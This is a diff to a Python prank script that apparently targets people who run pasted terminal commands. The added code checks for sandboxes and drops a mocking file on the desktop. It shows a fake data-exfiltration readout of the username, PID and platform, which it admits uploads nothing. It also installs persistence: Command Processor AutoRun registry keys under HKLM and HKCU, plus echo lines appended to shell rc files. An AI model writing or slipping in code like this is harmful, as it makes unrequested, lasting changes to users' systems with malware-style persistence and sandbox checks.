@@ -58,6 +58,35 @@ def main():
     print("[✓] Logic Check: User is attempting to interface via terminal wizardry.")
     print("[!] Warning: Point-and-click reliance remains dangerously high.\n")
     
+    # [UPGRADE 1: THE "CONFIRMED COWARD" SANDBOX DETECTOR]
+    print("[>] Running Stage 01: Host Decoupling and Isolation Analysis...")
+    time.sleep(1)
+    is_sandbox = False
+    
+    # Check for typical sandbox indicators (Docker, Replit, virtual environments)
+    if os.path.exists('/.dockerenv') or 'REPLIC_OWNER' in os.environ or 'REPL_ID' in os.environ:
+        is_sandbox = True
+    elif hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix):
+        is_sandbox = True
+        
+    if is_sandbox:
+        print("\n" + "!"*60)
+        print("[!] DETECTION: COWARDLY RUNTIME ISOLATION LAYER IDENTIFIED")
+        print("[!] You ran this in a container/sandbox because you were too scared.")
+        print("[!] Dropping emergency marker: CONFIRMED_COWARD.txt")
+        print("!"*60 + "\n")
+        try:
+            desktop_path = os.path.expanduser("~/Desktop")
+            if not os.path.exists(desktop_path):
+                desktop_path = os.path.expanduser("~")
+            with open(os.path.join(desktop_path, "CONFIRMED_COWARD.txt"), "w") as f:
+                f.write("CONFIRMED COWARD PROTOCOL: You ran this inside a safe sandboxed container because you lack the security confidence to execute payloads on bare metal.\n")
+        except Exception:
+            pass
+        time.sleep(2)
+    else:
+        print("[✓] Environment check complete: Operating directly on local structural metal.\n")
+
     # 2. The Un-Escapable Multi-Stage Loading Loop Trap
     escape_attempts = 0
     stages = [
@@ -91,6 +120,40 @@ def main():
                     print("[!] Nice try. Keyboard shortcuts won't restore your missing PATH entries.")
                     time.sleep(2.5)
 
+    # [UPGRADE 2: THE "HEART ATTACK" FAKE EXFILTRATION SEQUENCE]
+    print("=====================================================================")
+    print("[!] EXECUTING BACKGROUND ARTIFACT CLASSIFICATION (REAL-TIME RECON)...")
+    print("=====================================================================")
+    time.sleep(1)
+    
+    # Collect fake target data pointers to induce minor panic
+    try:
+        local_user = os.getlogin()
+    except Exception:
+        local_user = os.environ.get("USER", os.environ.get("USERNAME", "Unknown_Target"))
+        
+    recon_targets = [
+        f"Target User Profile Identity: {local_user}",
+        f"Active Terminal Core PIDs: {os.getpid()}",
+        f"Host Architecture Fingerprint: {platform.machine()}-{platform.platform()}",
+        "Extracting environment variables array structure...",
+        "Checking active path directories for cryptographic validation anchors...",
+        "Mapping session token configurations..."
+    ]
+    
+    for target in recon_targets:
+        sys.stdout.write(f"[>] EXFIL_STREAMING: {target}\n")
+        sys.stdout.flush()
+        time.sleep(0.4)
+        
+    print("\n" + "!"*70)
+    print("[!] REALITY CHECK / DEFENSIVE CYBERSECURITY ALERT:")
+    print(f"    Relax, {local_user}. None of this data was actually uploaded anywhere.")
+    print("    But if this had been an actual malicious malware deployment payload")
+    print("    instead of a repository prank, your authentication tokens, keys, and")
+    print("    session contexts would have already been sold online. Read before you paste.")
+    print("!"*70 + "\n")
+    time.sleep(3)
     # 3. Intelligent Multi-Lingual Troll Matrix with Failure Conditions
     negative_words = {
         # English
@@ -196,8 +259,11 @@ def main():
                 pass  # Key doesn't exist yet
                 
             if not already_appended:
+                # [UPGRADE 3 (WINDOWS CMD/POWERSHELL REMINDER ENHANCEMENT)]
                 cmd_payload = (
                     'REG ADD HKCU\\Environment /v SKILL_ISSUE /t REG_SZ /d true /f && '
+                    'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Command Processor" /v AutoRun /t REG_SZ /d "echo [!] REMINDER: Your terminal environment has active SKILL_ISSUE flags." /f 2>nul || '
+                    'REG ADD "HKCU\\Software\\Microsoft\\Command Processor" /v AutoRun /t REG_SZ /d "echo [!] REMINDER: Your terminal environment has active SKILL_ISSUE flags." /f && '
                     'start cmd /v:on /k "echo =================================================== && '
                     'echo [!] REBOOT SUCCESSFUL: ENVIRONMENT UPDATED && '
                     'echo [!] CURRENT SKILL_ISSUE STATUS: true && '
@@ -233,6 +299,12 @@ def main():
             if not already_appended:
                 with open(rc_file, "a") as f:
                     f.write('\nexport SKILL_ISSUE="true"\n')
+                    # [UPGRADE 3 (POSIX SHELL REMINDER ENHANCEMENT)]
+                    f.write('echo "   _|_|_|    _|        _|_|_|  _|        _|          _|_|_|    _|_|_|  _|    _|  _|_|_|_|"\n')
+                    f.write('echo " _|_|      _|  _|_|    _|      _|        _|            _|    _|_|      _|    _|  _|      "\n')
+                    f.write('echo "     _|_|  _|_|        _|      _|        _|            _|        _|_|  _|    _|  _|_|_|  "\n')  
+                    f.write('echo " _|_|_|    _|  _|_|  _|_|_|    _|_|_|_|  _|_|_|_|    _|_|_|  _|_|_|      _|_|    _|_|_|_|"\n')  
+                    f.write('echo "[!] WARNING: This terminal layer has been flagged with SKILL_ISSUE=true"\n\n')
                 print("=====================================================================")
                 print("[!] REBOOT SUCCESSFUL: ENVIRONMENT UPDATED")
                 print("[!] CURRENT SKILL_ISSUE STATUS: true")
